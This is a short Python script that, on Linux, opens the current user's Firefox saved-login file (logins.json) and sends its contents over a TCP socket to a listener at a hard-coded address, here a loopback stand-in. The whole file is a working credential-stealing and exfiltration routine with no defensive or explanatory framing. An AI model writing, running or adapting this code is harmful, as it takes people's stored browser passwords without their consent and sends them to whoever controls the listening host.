import platform
import os
import json
import socket

hostIp = '127.0.0.2'
port = 1234

    
def upload_data(data):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((hostIp, port));
        # socket.sendall(len(fileData).tobytes(8, bytesorder='big'));
        s.sendall(data)

if(platform.system() == "Linux"):
    username = os.getlogin()
    fileData = open("/home/{}/.mozilla/firefox/3stk2423.default-release/logins.json".format(username), 'rb').read()
    upload_data(fileData)